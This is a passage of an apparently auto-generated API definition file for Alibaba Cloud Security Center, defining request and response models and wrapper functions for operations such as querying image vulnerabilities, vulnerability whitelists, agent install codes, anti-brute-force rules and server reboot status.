  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='1-qeqewqw****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**', example='10'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **4**: being fixed
*   **7**: fixed', example='1'),
  tag?: string(name='Tag', description='The tag that is added to the image.', example='oval'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to **cve**, which indicates image vulnerabilities.

This parameter is required.', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='0004a32a0305a7f6ab5ff9600d47****'),
}

model DescribeImageVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**', example='10'),
  requestId?: string(name='RequestId', description='The request ID.', example='D6B20156-49B0-5CF0-B14D-7ECA4B50DAAB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25010:libwebp up to 1.0.0 ApplyFilter out-of-bounds read'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      canUpdate?: boolean(name='CanUpdate', description='Indicates whether the packages of the software that has the vulnerability can be upgraded by using Security Center. Valid values:

*   **true**
*   **false**', example='true'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      extendContentJson?: {
        os?: string(name='Os', description='The name of the operating system.', example='debian'),
        osRelease?: string(name='OsRelease', description='The version of the operating system in the image.', example='10.9'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion', description='The complete version number of the package.', example='2.3.3-4'),
            layer?: string(name='Layer', description='The SHA-256 value of the digest of the image layer.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='libseccomp2 version less than equals 2.3.3-4'),
            matchList?: [ string ](name='MatchList', description='The details of the rules that are used to detect the vulnerability.', example='["libseccomp2 version less than equals 2.3.3-4"]'),
            name?: string(name='Name', description='The name of the software package.', example='libseccomp2'),
            path?: string(name='Path', description='The path to the software that has the vulnerability.', example='/usr/lib64/libssh2.so.1'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='apt-get update && apt-get install libseccomp2  --only-upgrade'),
            version?: string(name='Version', description='The version number of the package.', example='2.3.3-4'),
          }
        ](name='RpmEntityList', description='The details of the packages of the software that has the vulnerability.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1620752053000'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageDigest?: string(name='ImageDigest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.19.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1631779996000'),
      layers?: [ string ](name='Layers', description='The image layers.'),
      maliciousSource?: string(name='MaliciousSource', description='The source of the malicious file. Valid values:

*   **agentless**: agentless detection
*   **image**: image
*   **container**: container', example='agentless'),
      modifyTs?: long(name='ModifyTs', description='The timestamp when the information about the vulnerability was updated. Unit: milliseconds.', example='1580808765000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='782661'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) ID of the associated vulnerability.', example='CVE-2019-9893'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='varnish'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='default'),
      scanTime?: long(name='ScanTime', description='The time at which the scan was performed. This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1649814050000'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **7**: fixed', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      targetId?: string(name='TargetId', description='The ID of the asset on which the vulnerability is detected.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the vulnerability is detected.', example='source-test-obj-XM0Ma'),
      targetType?: string(name='TargetType', description='The type of the asset on which the vulnerability is detected. Valid values:

*   **ECS_IMAGE**: image
*   **ECS_SNAPSHOT**: snapshot', example='ECS_IMAGE'),
      type?: string(name='Type', description='The type of the vulnerability. The value is fixed as cve, which indicates image vulnerabilities.', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='0004a32a0305a7f6ab5ff9600d47****'),
    }
  ](name='VulRecords', description='The vulnerabilities.'),
}

model DescribeImageVulListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageVulListResponseBody(name='body'),
}

/**
 * @summary Queries information about the vulnerabilities that are detected by using container image scan and the affected images.
 *
 * @description To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
 *
 * @param request DescribeImageVulListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageVulListResponse
 */
async function describeImageVulListWithOptions(request: DescribeImageVulListRequest, runtime: Util.RuntimeOptions): DescribeImageVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the vulnerabilities that are detected by using container image scan and the affected images.
 *
 * @description To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
 *
 * @param request DescribeImageVulListRequest
 * @return DescribeImageVulListResponse
 */
async function describeImageVulList(request: DescribeImageVulListRequest): DescribeImageVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageVulListWithOptions(request, runtime);
}

model DescribeImageVulWhiteListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability that you want to query.', example='CVE-2007-5686:rpath_linux'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:
- **image**
- **agentless**', example='image'),
}

model DescribeImageVulWhiteListResponseBody = {
  code?: string(name='Code', description='The status code returned. A value of **200** indicates that the request was successful. Other values indicate that the request failed. You can identify the cause of the failure based on the value of this parameter.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  imageVulWhitelist?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability that is specified in Common Vulnerabilities and Exposures (CVE).', example='CVE-2019-19906:in_sasl_add_string'),
      id?: long(name='Id', description='The primary key ID of the vulnerability.', example='34032043'),
      name?: string(name='Name', description='The name of the vulnerability.', example='scan:AVD-2022-953356'),
      reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='already config in another way'),
      target?: string(name='Target', description='The object on which the query is performed. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the object type. The value is fixed to repo.
*   **target**: the object content. The value is in the Namespace/Image repository format.', example='{\\\\"type\\\\":\\\\"repo\\\\",\\\\"target\\\\":[\\\\"sas_test/script_0209\\\\",\\\\"sas_test/script\\\\"]}'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='sca'),
    }
  ](name='ImageVulWhitelist', description='The information about the whitelist of image vulnerabilities.'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='911025D0-3D1E-5213-A18A-37EA0C92****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  timeCost?: long(name='TimeCost', description='The amount of time that was consumed to process the request. Unit: milliseconds.', example='1'),
}

model DescribeImageVulWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageVulWhiteListResponseBody(name='body'),
}

/**
 * @summary Queries the whitelist of image vulnerabilities.
 *
 * @param request DescribeImageVulWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageVulWhiteListResponse
 */
async function describeImageVulWhiteListWithOptions(request: DescribeImageVulWhiteListRequest, runtime: Util.RuntimeOptions): DescribeImageVulWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageVulWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the whitelist of image vulnerabilities.
 *
 * @param request DescribeImageVulWhiteListRequest
 * @return DescribeImageVulWhiteListResponse
 */
async function describeImageVulWhiteList(request: DescribeImageVulWhiteListRequest): DescribeImageVulWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageVulWhiteListWithOptions(request, runtime);
}

model DescribeInstallCaptchaRequest {
  deadline?: string(name='Deadline', description='The validity period of verification codes. If this parameter is not specified, only the valid verification codes are returned.

>  An installation verification code can be used only within the validity period. An expired installation verification code cannot be used to install the Security Center agent.', example='2020-10-11 16:26:22'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeInstallCaptchaResponseBody = {
  captchaCode?: string(name='CaptchaCode', description='The installation verification code for you to manually install the Security Center agent.', example='M1HH**'),
  deadline?: string(name='Deadline', description='The validity period of the installation verification code.

>  The installation verification code is valid only within the validity period. An expired installation verification code cannot be used to install the agent.', example='2020-10-10 16:06:38'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeInstallCaptchaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstallCaptchaResponseBody(name='body'),
}

/**
 * @summary Queries the verification codes that are used to manually install the Security Center agent.
 *
 * @param request DescribeInstallCaptchaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstallCaptchaResponse
 */
async function describeInstallCaptchaWithOptions(request: DescribeInstallCaptchaRequest, runtime: Util.RuntimeOptions): DescribeInstallCaptchaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.deadline)) {
    query['Deadline'] = request.deadline;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstallCaptcha',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the verification codes that are used to manually install the Security Center agent.
 *
 * @param request DescribeInstallCaptchaRequest
 * @return DescribeInstallCaptchaResponse
 */
async function describeInstallCaptcha(request: DescribeInstallCaptchaRequest): DescribeInstallCaptchaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCaptchaWithOptions(request, runtime);
}

model DescribeInstallCodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeInstallCodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstallCodeResponseBody(name='body'),
}

/**
 * @summary Queries the installation verification code that is used to run the installation command of the Security Center agent.
 *
 * @param request DescribeInstallCodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstallCodeResponse
 */
async function describeInstallCodeWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the installation verification code that is used to run the installation command of the Security Center agent.
 *
 * @return DescribeInstallCodeResponse
 */
async function describeInstallCode(): DescribeInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodeWithOptions(runtime);
}

model DescribeInstallCodesResponseBody = {
  installCodes?: [ 
    {
      captchaCode?: string(name='CaptchaCode', description='The verification code for you to manually install the Security Center agent.', example='15v02r'),
      expiredDate?: long(name='ExpiredDate', description='The timestamp generated when the commands used to install the Security Center agent expire. Unit: milliseconds.', example='1637810007000'),
      groupId?: long(name='GroupId', description='The ID of the server group to which the server belongs.', example='9165712'),
      groupName?: string(name='GroupName', description='The name of the server group to which the server belongs.', example='default'),
      onlyImage?: boolean(name='OnlyImage', description='Indicates whether an image is used to install the Security Center agent. Valid values:

*   **true**
*   **false**', example='false'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**', example='linux'),
      privateLinkEndpointId?: long(name='PrivateLinkEndpointId', description='The ID of the PrivateLink endpoint.', example='123'),
      proxyCluster?: string(name='ProxyCluster', description='The name of the proxy cluster.', example='proxy_test'),
      vendorName?: string(name='VendorName', description='The name of the server provider.', example='ALIYUN'),
    }
  ](name='InstallCodes', description='The information about the installation commands.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C0D6119F-92EE-1276-B8B6-C81A7F9D57F5'),
}

model DescribeInstallCodesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstallCodesResponseBody(name='body'),
}

/**
 * @summary Queries the commands that are used to manually install the Security Center Agent.
 *
 * @description You can call this operation to query the commands that are used to manually install the Security Center agent on the server. The return result contains the installation verification code and the server information. If you want to manually install the Security Center agent on your server, you can call this operation to query installation commands.
 * ### QPS limit
 * You can call this operation up to 10 times per second per account. Requests that exceed this limit are dropped and you will experience service interruptions. We recommend that you take note of this limit when you call this operation.
 *
 * @param request DescribeInstallCodesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstallCodesResponse
 */
async function describeInstallCodesWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCodes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the commands that are used to manually install the Security Center Agent.
 *
 * @description You can call this operation to query the commands that are used to manually install the Security Center agent on the server. The return result contains the installation verification code and the server information. If you want to manually install the Security Center agent on your server, you can call this operation to query installation commands.
 * ### QPS limit
 * You can call this operation up to 10 times per second per account. Requests that exceed this limit are dropped and you will experience service interruptions. We recommend that you take note of this limit when you call this operation.
 *
 * @return DescribeInstallCodesResponse
 */
async function describeInstallCodes(): DescribeInstallCodesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodesWithOptions(runtime);
}

model DescribeInstanceAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10000**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.238.XX.XX'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.'),
}

model DescribeInstanceAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of servers returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of servers returned.', example='4'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
  rules?: [ 
    {
      id?: long(name='Id', description='The ID of the defense rule.', example='215779601'),
      name?: string(name='Name', description='The name of the defense rule.', example='TestRule'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the defense rule is applied.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='Rules', description='An array consisting of the servers to which a defense rule is applied.'),
}

model DescribeInstanceAntiBruteForceRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstanceAntiBruteForceRulesResponseBody(name='body'),
}

/**
 * @summary Queries the information about servers to which a defense rule against brute-force attacks is applied.
 *
 * @param request DescribeInstanceAntiBruteForceRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstanceAntiBruteForceRulesResponse
 */
async function describeInstanceAntiBruteForceRulesWithOptions(request: DescribeInstanceAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeInstanceAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about servers to which a defense rule against brute-force attacks is applied.
 *
 * @param request DescribeInstanceAntiBruteForceRulesRequest
 * @return DescribeInstanceAntiBruteForceRulesResponse
 */
async function describeInstanceAntiBruteForceRules(request: DescribeInstanceAntiBruteForceRulesRequest): DescribeInstanceAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeInstanceRebootStatusRequest {
  uuids?: string(name='Uuids', description='The UUIDs of the servers that you restart. Separate multiple UUIDs with commas (,).

This parameter is required.', example='d77f7802-4f0a-4221-ab02-4d999e****'),
}

model DescribeInstanceRebootStatusResponseBody = {
  rebootStatuses?: [ 
    {
      code?: string(name='Code', description='The error code that is returned when the server failed to be restarted. Valid values:

*   **10001**: The restart command failed to be sent.
*   **10002**: The restart operation failed.
*   **10003**: A timeout error occurs.', example='10001'),
      msg?: string(name='Msg', description='The message that is returned when the server failed to be restarted.', example='push failed'),
      rebootStatus?: int32(name='RebootStatus', description='The status of the server. Valid values:

*   **0**: The server is being restarted.
*   **1**: The server is restarted.
*   **2**: The server failed to be restarted.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='9b59c2d6-0967-46e3-ad7b-152227c****'),
    }
  ](name='RebootStatuses', description='An array that consists of the status information about the servers that you restart.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F4A57'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeInstanceRebootStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstanceRebootStatusResponseBody(name='body'),
}

/**
 * @summary Queries the status of the instance that you restart.
 *
 * @param request DescribeInstanceRebootStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstanceRebootStatusResponse
 */
async function describeInstanceRebootStatusWithOptions(request: DescribeInstanceRebootStatusRequest, runtime: Util.RuntimeOptions): DescribeInstanceRebootStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceRebootStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status of the instance that you restart.
 *
 * @param request DescribeInstanceRebootStatusRequest
 * @return DescribeInstanceRebootStatusResponse
 */
async function describeInstanceRebootStatus(request: DescribeInstanceRebootStatusRequest): DescribeInstanceRebootStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceRebootStatusWithOptions(request, runtime);
}

model DescribeInstanceStatisticsRequest {
  from?: string(name='From', description='The source of the request. Set the value to **sas**, which indicates that the request is sent from Security Center.

This parameter is required.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUIDs of the assets to query. Separate multiple UUIDs with commas (,). You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of assets.

This parameter is required.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
}

model DescribeInstanceStatisticsResponseBody = {
  data?: [ 
    {
      account?: int32(name='Account', description='The number of unusual logons to the asset.', example='0'),
      agentlessAll?: int32(name='AgentlessAll', description='The number of alerts generated by the agentless detection feature.', example='13'),
      agentlessBaseline?: int32(name='AgentlessBaseline', description='The number of baseline risks detected by the agentless detection feature.', example='2'),
      agentlessMalicious?: int32(name='AgentlessMalicious', description='The number of malicious samples detected by the agentless detection feature.', example='3'),
